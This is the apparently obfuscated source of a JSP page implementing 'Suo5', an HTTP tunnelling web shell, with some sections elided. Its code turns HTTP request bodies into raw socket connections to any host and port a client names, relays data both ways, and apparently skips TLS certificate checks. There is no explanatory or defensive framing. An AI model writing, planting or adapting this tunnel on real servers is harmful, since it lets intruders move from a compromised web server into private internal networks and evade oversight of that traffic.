<%@ page import="java.nio.ByteBuffer" %><%@ page import="java.io.*" %><%@ page import="java.net.*" %><%@ page import="java.security.cert.X509Certificate" %><%@ page import="java.security.cert.CertificateException" %><%@ page import="javax.net.ssl.*" %><%@ page import="java.util.*" %><%!
    public static class Suo5 implements Runnable, HostnameVerifier, X509TrustManager {
        public static HashMap addrs = skEgqVmoQf();
        ...
        public void skmianpcjs(ServletRequest sReq, ServletResponse sResp) {
...
//                System.out.printf("skmianpcjs data error %s", e);
//                e.printStackTrace();
            }
        }

        public void skepTVxhkw(InputStream is, byte[] b) throws IOException, InterruptedException {
            int bufferOffset = 0;
        ...
        public void skNlmqSqeu(HttpServletRequest request, HttpServletResponse response) throws IOException, InterruptedException {
        ...
        byte[] skOaJgmZkc(byte[] original, int from, int to) {
        ...
        private byte[] skPDyurNVC(HashMap m) throws IOException {
            ...
            for (int i = 0; i < keys.length; i++) {
                ...
                buf.write(skHjeoUdzD(value.length));
                buf.write(value);
            }
        ...
        private HashMap skKcAjRDvS(InputStream in) throws Exception {
            byte[] header = new byte[4 + 1]; // size and datatype
            skepTVxhkw(in, header);
            // read full
            ...
            for (int i = 0; i < bs.length - 1; ) {
                ...
                buf = skOaJgmZkc(bs, i, i + 4);
                int vLen = skSGVgSReG(buf);
                i += 4;
                if (vLen < 0) {
                ...
                byte[] value = skOaJgmZkc(bs, i, i + vLen);
                i += vLen;
        ...
        private void processDataBio(HttpServletRequest request, HttpServletResponse resp) throws Exception {
            ...
            HashMap dataMap = skKcAjRDvS(reqInputStream);
            ...
            try {
                ...
                if (port == 0) {
                    try {
                        ...
                        Class skhYAzyKDC = request.getClass();
                        port = ((Integer) skhYAzyKDC.getMethod("getLocalPort", new Class[]{}).invoke(request, new Object[]{})).intValue();
                    } catch (Exception e) {
                        Class skhYAzyKDC = request.getClass();
                        port = ((Integer) skhYAzyKDC.getMethod("getServerPort", new Class[]{}).invoke(request, new Object[]{})).intValue();
                    }
                }
                sc = new Socket();
                sc.connect(new InetSocketAddress(host, port), 5000);
            } catch (Exception e) {
                respOutStream.write(skPDyurNVC(newStatus((byte) 0x01)));
                respOutStream.flush();
                respOutStream.close();
                return;
            }

            respOutStream.write(skPDyurNVC(newStatus((byte) 0x00)));
            respOutStream.flush();
            resp.flushBuffer();
...
//                System.out.printf("pipe error, %s", e);
        ...
        private void skmhQMzCCZ(InputStream inputStream, OutputStream outputStream, boolean needMarshal) throws IOException {
            ...
            while (true) {
                ...
                byte[] dataTmp = skOaJgmZkc(readBuf, 0, 0 + n);
                if (needMarshal) {
                    dataTmp = skPDyurNVC(newData(dataTmp));
                }
        ...
        private void readReq(InputStream bufInputStream, OutputStream socketOutStream) throws Exception {
            while (true) {
                HashMap dataMap;
                dataMap = skKcAjRDvS(bufInputStream);
        ...
        private void processDataUnary(HttpServletRequest request, HttpServletResponse resp) throws
            ...
            if (needRedirect) {
                ...
                needRedirect = !skKxDgykNd(redirectUrl);
            }
            ...
            if (action == 0x02) {
                ...
                Object o = this.get(clientId);
                if (o == null) {
                    respOutStream.write(skPDyurNVC(newDel()));
                    respOutStream.flush();
                    respOutStream.close();
                    return;
                }
...
//                    System.out.printf("connect error %s", e);
//                    e.printStackTrace();
            ...
            try {
                skmhQMzCCZ(readFrom, respOutStream, !needRedirect);
            } catch (Exception e) {
...
//                e.printStackTrace();
        ...
        public void run() {
            try {
                skmhQMzCCZ(gInStream, gOutStream, true);
            } catch (Exception e) {
...
//                e.printStackTrace();
        ...
        boolean skKxDgykNd(String url) throws Exception {
        ...
        HttpURLConnection redirect(HttpServletRequest request, HashMap dataMap, String rUrl) throws Exception {
            ...
            try {
                ...
                Class skjMbnudlh = conn.getClass();
                skjMbnudlh.getMethod("setConnectTimeout", new Class[]{int.class}).invoke(conn, new Object[]{new Integer(3000)});
                // conn.setReadTimeout(0);
                skjMbnudlh.getMethod("setReadTimeout", new Class[]{int.class}).invoke(conn, new Object[]{new Integer(0)});
            } catch (Exception e) {
                // java1.4
            }
            ...
            byte[] newBody = skPDyurNVC(dataMap);
